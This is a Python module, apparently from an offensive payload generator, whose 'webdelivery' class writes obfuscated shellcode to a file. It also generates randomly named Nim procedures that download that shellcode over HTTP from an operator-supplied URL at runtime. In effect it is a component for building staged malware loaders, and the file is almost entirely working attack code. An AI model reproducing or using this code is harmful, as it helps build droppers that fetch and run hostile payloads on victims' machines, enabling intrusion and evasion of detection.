import random
import string
from c.utils.formatters import *

class webdelivery:

    def __init__(self, shellcode: str | bytes | list[str], arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'outfile' in arguments:
            outfile = arguments['outfile']
        else:
            outfile = 'output.txt'
        self.type = type(shellcode).__name__
        if self.type  == 'bytes':
            open(outfile, 'wb').write(shellcode)
        elif self.type == 'str':
            open(outfile, 'w').write(shellcode)
        elif self.type == 'list':
            open(outfile, 'w').write('\n'.join(shellcode))
            self.listLength = len(shellcode)
        print(f'Writing obfuscated shellcode to {outfile}')
        if 'url' in arguments:
            self.url = arguments['url']
        else:
            print('No url specified')
            exit(0)

    def imports(self) -> list[str]:
        return ['import std/httpclient', 
                'import strutils']

    def compilerOptions(self) -> list[str]:
        return []

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}()')

    def codeblock(self) -> str:
        if self.type == 'bytes':
            return f"""
proc {self.name}(): seq[byte] =
    var client = newHttpClient()
    try:
        let response = client.getContent("{self.url}")
        var obfuscated = newSeq[byte](response.len)
        for i in 0 ..< response.len:
            obfuscated[i] = response[i].byte
        result = obfuscated
    finally:
        client.close()
"""
        elif self.type == 'str':
            return f"""
proc {self.name}(): string =
    var client = newHttpClient()
    try:
        let response = client.getContent("{self.url}")
        result = response
    finally:
        client.close()
"""
        elif self.type == 'list':
            return f"""
proc {self.name}(): seq[string] =
    var client = newHttpClient()
    let response = client.getContent("{self.url}")
    result = response.split('\\n')
    client.close()
"""
